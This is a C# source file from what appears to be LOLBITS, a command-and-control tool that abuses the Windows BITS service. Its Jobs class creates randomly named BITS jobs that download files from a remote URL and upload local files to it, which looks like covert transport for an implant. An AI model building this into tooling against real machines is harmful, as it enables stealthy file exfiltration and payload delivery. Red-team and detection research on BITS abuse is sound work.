using System;
using System.Linq;
using BITS4 = BITSReference4_0;


namespace LOLBITS
{
    public  class Jobs
    {

        private static readonly Random Random = new Random();
        private readonly object _url;
        private enum JobType {Download=0, Upload=1, UploadReply=2};

        public Jobs(object url)
        {
            this._url = url;
        }

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[Random.Next(s.Length)]).ToArray());
        }

        private bool CreateJob(int type, out BITS4.GUID jobGuid, out BITS4.IBackgroundCopyJob job)
        {
            var mgr = new BITS4.BackgroundCopyManager4_0();
            string randJobName = RandomString(15);
            switch (type)
            {
                case 0:
                    mgr.CreateJob(randJobName, BITS4.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
                    break;
                case 1:
                    mgr.CreateJob(randJobName, BITS4.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
                    break;
                case 2:
                    mgr.CreateJob(randJobName, BITS4.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD_REPLY, out jobGuid, out job);
                    break;
                default:
                    jobGuid = new BITS4.GUID();
                    job = null;
                    break;

            }

            return job != null ? true : false;
        }

        private bool ExecuteJob(BITS4.IBackgroundCopyJob job)
        {
            bool jobIsFinal = false;
            bool jobCompleted = false;
            while (!jobIsFinal)
            {
                BITS4.BG_JOB_STATE state;
                job.GetState(out state);
               
                    switch (state)
                    {
                        case BITS4.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                            job.Cancel();
                            break;
                        case BITS4.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                            job.Complete();
                            jobCompleted = true;
                            break;
                        case BITS4.BG_JOB_STATE.BG_JOB_STATE_CANCELLED:
                            jobIsFinal = true;
                            break;
                        case BITS4.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                            jobIsFinal = true;
                            break;
                        default:
                            break;
                    }
               
            }

            return jobCompleted ? true : false;
        }


        public bool Get(string id, string filePath, string headers, BITS4.BG_JOB_PRIORITY priority)
        {
            CreateJob((int)JobType.Download, out BITS4.GUID jobGuid, out BITS4.IBackgroundCopyJob job);
            job.SetPriority(priority);
            job.AddFile(_url + id, @filePath);

            if(headers != null)
            {
                var jobHttpOptions = job as BITS4.IBackgroundCopyJobHttpOptions;
                jobHttpOptions.SetCustomHeaders(headers);
            }
            

            //job.SetNoProgressTimeout(5); how many seconds?
            job.Resume();
            return ExecuteJob(job);
        }

        public bool Send(string id, string filePath)
        {
            CreateJob((int)JobType.Upload, out BITS4.GUID jobGuid, out BITS4.IBackgroundCopyJob job);
            job.AddFile(_url + id, @filePath);
            job.Resume();


            return ExecuteJob(job);
        }
        
    }

   

}
